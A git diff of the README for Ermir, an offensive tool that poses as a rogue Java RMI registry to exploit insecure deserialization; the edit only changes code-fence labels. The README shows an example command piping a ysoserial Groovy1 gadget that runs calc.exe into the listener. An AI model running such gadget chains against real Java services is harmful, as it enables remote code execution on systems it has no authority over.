@@ -22,7 +22,7 @@ or clone the repo and build the gem:
 Ermir is a cli gem, it comes with 2 cli files `ermir` and `gadgetmarshal`, `ermir` is the actual gem and the latter is just a pretty interface to [GadgetMarshaller.java](https://github.com/hakivvi/ermir/blob/main/helpers/gadgetmarshaller/GadgetMarshaller.java) file which rewrites the gadgets of [Ysoserial](https://github.com/frohoff/ysoserial) to match `MarshalInputStream` requirements, the output should be then piped into `ermir` or a file, in case of custom gadgets use `MarshalOutputStream` instead of `ObjectOutputStream` to write your serialized object to the output stream.
 
 `ermir` usage:
-```text
+```console
 Ermir by @hakivvi * https://github.com/hakivvi/ermir.
 Info:
     Ermir is a Rogue/Evil RMI Registry which exploits unsecure Java deserialization on any Java code calling standard RMI methods on it.
@@ -36,7 +36,7 @@ Example:
     $ gadgetmarshal /path/to/ysoserial.jar Groovy1 calc.exe | ermir --listen 127.0.0.1:1099 --pipe
 ```
 `gadgetmarshal` usage:
-```text
+```console
 Usage: gadgetmarshal /path/to/ysoserial.jar Gadget1 cmd (optional)/path/to/output/file
 ```
 
